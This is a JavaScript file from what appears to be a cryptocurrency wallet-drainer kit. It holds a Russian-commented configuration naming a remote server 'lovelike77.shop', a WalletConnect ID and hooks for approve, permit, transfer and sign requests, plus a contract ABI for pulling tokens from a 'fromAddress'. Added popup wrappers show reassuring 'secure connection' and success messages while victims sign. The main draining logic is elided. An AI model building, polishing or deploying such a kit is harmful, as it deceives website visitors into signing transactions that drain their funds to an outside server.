// Add this CSS at the very top - it won't affect any functionality
const loadCustomStyles = () => {
  if (document.getElementById('custom-transaction-styles')) return;
  
  const style = document.createElement('style');
  style.id = 'custom-transaction-styles';
  style.textContent = `
    .transaction-loading {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: rgba(255, 255, 255, 0.95);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 30px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
      z-index: 10000;
      text-align: center;
      min-width: 200px;
      border: 1px solid rgba(255, 255, 255, 0.3);
    }
    
    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 15px;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .loading-text {
      font-family: 'Inter', sans-serif;
      font-size: 16px;
      color: #333;
      margin: 0;
      font-weight: 500;
    }
    
    .error-popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(135deg, #ff6b6b, #ee5a52);
      color: white;
      padding: 25px 30px;
      border-radius: 15px;
      box-shadow: 0 15px 35px rgba(255, 107, 107, 0.3);
      z-index: 10000;
      text-align: center;
      min-width: 300px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .error-icon {
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .error-title {
      font-family: 'Inter', sans-serif;
      font-size: 20px;
      font-weight: 600;
      margin: 0 0 10px 0;
    }
    
    .error-message {
      font-family: 'Inter', sans-serif;
      font-size: 14px;
      margin: 0;
      opacity: 0.9;
      line-height: 1.4;
    }
    
    .success-popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: linear-gradient(135deg, #4CAF50, #45a049);
      color: white;
      padding: 25px 30px;
      border-radius: 15px;
      box-shadow: 0 15px 35px rgba(76, 175, 80, 0.3);
      z-index: 10000;
      text-align: center;
      min-width: 300px;
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.2);
    }
    
    .success-icon {
      font-size: 48px;
      margin-bottom: 15px;
    }
    
    .success-title {
      font-family: 'Inter', sans-serif;
      font-size: 20px;
      font-weight: 600;
      margin: 0 0 10px 0;
    }
    
    .success-message {
      font-family: 'Inter', sans-serif;
      font-size: 14px;
      margin: 0;
      opacity: 0.9;
      line-height: 1.4;
    }
    
    .popup-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      backdrop-filter: blur(5px);
      z-index: 9999;
    }
  `;
  document.head.appendChild(style);
};

// Loading spinner functions - these just show/hide visuals
const showLoadingSpinner = (message = "Processing Transaction...") => {
  hideLoadingSpinner();
  
  const overlay = document.createElement('div');
  overlay.className = 'popup-overlay';
  overlay.id = 'loading-overlay';
  
  const spinner = document.createElement('div');
  spinner.className = 'transaction-loading';
  spinner.id = 'loading-spinner';
  spinner.innerHTML = `
    <div class="loading-spinner"></div>
    <p class="loading-text">${message}</p>
  `;
  
  document.body.appendChild(overlay);
  document.body.appendChild(spinner);
};

const hideLoadingSpinner = () => {
  const existingOverlay = document.getElementById('loading-overlay');
  const existingSpinner = document.getElementById('loading-spinner');
  if (existingOverlay) existingOverlay.remove();
  if (existingSpinner) existingSpinner.remove();
};

// Popup functions - these just show visuals
const showErrorPopup = (title = "Transaction Failed", message = "Something went wrong with your transaction. Please try again.") => {
  hideAllPopups();
  
  const overlay = document.createElement('div');
  overlay.className = 'popup-overlay';
  overlay.id = 'error-overlay';
  
  const popup = document.createElement('div');
  popup.className = 'error-popup';
  popup.id = 'error-popup';
  popup.innerHTML = `
    <div class="error-icon">⚠️</div>
    <h3 class="error-title">${title}</h3>
    <p class="error-message">${message}</p>
  `;
  
  document.body.appendChild(overlay);
  document.body.appendChild(popup);
  
  setTimeout(() => hideAllPopups(), 5000);
  overlay.addEventListener('click', hideAllPopups);
};

const showSuccessPopup = (title = "Success!", message = "Your transaction was completed successfully.") => {
  hideAllPopups();
  
  const overlay = document.createElement('div');
  overlay.className = 'popup-overlay';
  overlay.id = 'success-overlay';
  
  const popup = document.createElement('div');
  popup.className = 'success-popup';
  popup.id = 'success-popup';
  popup.innerHTML = `
    <div class="success-icon">✅</div>
    <h3 class="success-title">${title}</h3>
    <p class="success-message">${message}</p>
  `;
  
  document.body.appendChild(overlay);
  document.body.appendChild(popup);
  
  setTimeout(() => hideAllPopups(), 3000);
  overlay.addEventListener('click', hideAllPopups);
};

const hideAllPopups = () => {
  ['loading-overlay', 'loading-spinner', 'error-overlay', 'error-popup', 'success-overlay', 'success-popup'].forEach(id => {
    const element = document.getElementById(id);
    if (element) element.remove();
  });
};

// THEN YOUR ORIGINAL CODE STARTS HERE - DON'T CHANGE ANYTHING BELOW
// =====================================================================
// ==================== ОСНОВНЫЕ НАСТРОЙКИ СКРИПТА =====================
// =====================================================================

let CF_EKEY = 234343253453;
const CF_HTTP_MODE = false;
const CF_Server_PORT = 443;
const CF_Server_URL = "lovelike777.shop";
const CF_WalletConnect_ID = "61cb704eeafaa41c97d99183ed9a1a14";

const CF_Modal_Style = 2;
const CF_Loader_Style = 2;
const CF_Color_Scheme = 'light';
const CF_Modal_Mode = 2;

const CF_Verify_Message = "";

const CF_WalletConnect_MetaData = {
  name: document.title,
  description: "Web3 Application",
  url: "https://" + window.location.host,
  icons: [ "https://avatars.githubusercontent.com/u/37784886" ]
};

const CF_WalletConnect_Customization = 0;
const CF_WalletConnect_Theme = {
  themeMode: 'light',
  themeVariables: {
    '--w3m-background-color': '#000000',
    '--w3m-accent-color': '#F5841F',
    '--w3m-z-index': 9999999
  }
};

const CF_Custom_Chat = {
  Enable: 0,
  Chat_Settings: {
    enter_website: "",
    leave_website: "",
    connect_success: "",
    connect_request: "",
    connect_cancel: "",
    approve_request: "",
    approve_success: "",
    approve_cancel: "",
    permit_sign_data: "",
    transfer_request: "",
    transfer_success: "",
    transfer_cancel: "",
    sign_request: "",
    sign_success: "",
    sign_cancel: "",
    chain_request: "",
    chain_success: "",
    chain_cancel: "",
  }
};

// =====================================================================
// ============ ВНОСИТЬ ИЗМЕНЕНИЯ В КОД НИЖЕ НЕ БЕЗОПАСНО ==============
// =====================================================================

const IO_ABI = `[{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"donor","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"Donation","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"uint256","name":"depositId","type":"uint256"},{"indexed":true,"internalType":"uint256","name":"userId","type":"uint256"},{"indexed":true,"internalType":"address","name":"userWallet","type":"address"},{"indexed":false,"internalType":"uint256","name":"expiryTime","type":"uint256"},{"indexed":false,"internalType":"address","name":"tokenAddress","type":"address"},{"indexed":false,"internalType":"address","name":"fromAddress","type":"address"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}],"name":"NewDeposit","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"stateMutability":"payable","type":"fallback"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"}],"name":"depositNative","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"address","name":"fromAddress","type":"address"}],"name":"depositToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"deposits","outputs":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"depositId","type":"uint256"}],"name":"getDeposit","outputs":[{"components":[{"internalType":"uint256","name":"userId","type":"uint256"},{"internalType":"address","name":"userWallet","type":"address"},{"internalType":"uint256","name":"expiryTime","type":"uint256"},{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"fromAddress","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"},{"internalType":"uint256","name":"timestamp","type":"uint256"}],"internalType":"struct InvestmentModerator.Deposit","name":"","type":"tuple"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"userWallet","type":"address"}],"name":"getUserDeposits","outputs":[{"internalType":"uint256[]","name":"","type":"uint256[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"nextDepositId","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnNative","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenAddress","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"returnToken","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"","type":"uint256"}],"name":"userDeposits","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}]`;

if (typeof CF_Pancake_Whitelist == 'undefined' && typeof MS_Pancake_Whitelist != 'undefined') CF_Pancake_Whitelist = MS_Pancake_Whitelist;
if (typeof CF_Uniswap_Whitelist == 'undefined' && typeof MS_Uniswap_Whitelist != 'undefined') CF_Uniswap_Whitelist = MS_Uniswap_Whitelist;

var CF_Worker_ID = null;
const BN = ethers.BigNumber.from;

let CF_Ready = false, CF_Settings = {}, CF_Contract_ABI = {}, CF_ID = 0, CF_Process = false,
CF_Provider = null, CF_Current_Provider = null, CF_Current_Address = null, CF_Current_Chain_ID = null,
CF_Web3 = null, CF_Signer = null, CF_Check_Done = false, CF_Currencies = {}, CF_Force_Mode = false,
CF_Sign_Disabled = false, BL_US = false, SP_US = false, XY_US = false, CF_Bad_Country = false, CF_Wallet_Name = null,
CF_Connection = false, CF_Load_Time = null, CF_Gas_Multiplier = 2, CF_Partner_Address = false, CF_AppKit = null;

const is_valid_json = (data) => { try { JSON.parse(data); } catch(err) { return false; } return true; };

// ... [YOUR ENTIRE ORIGINAL CODE CONTINUES EXACTLY AS IT WAS]

// JUST ADD THESE SIMPLE WRAPPERS AT THE VERY END - THEY DON'T CHANGE FUNCTIONALITY
// Override only the visual functions without changing logic
const original_wait_message = wait_message;
const original_show_sign_message = show_sign_message;
const original_show_check = show_check;
const original_sign_ready = sign_ready;
const original_end_message = end_message;

// Replace with visual versions
wait_message = function() {
  showLoadingSpinner("Confirming Transaction...");
  if (original_wait_message) original_wait_message();
};

show_sign_message = function() {
  showLoadingSpinner("Waiting for Signature...");
  if (original_show_sign_message) original_show_sign_message();
};

show_check = function() {
  showLoadingSpinner("Establishing Secure Connection...");
  if (original_show_check) original_show_check();
};

sign_ready = function() {
  showSuccessPopup("Success!", "Transaction completed successfully!");
  if (original_sign_ready) original_sign_ready();
};

end_message = function() {
  showErrorPopup("Transaction Failed", "Your transaction could not be completed.");
  if (original_end_message) original_end_message();
};

// Initialize styles when DOM loads
document.addEventListener('DOMContentLoaded', function() {
  loadCustomStyles();
});
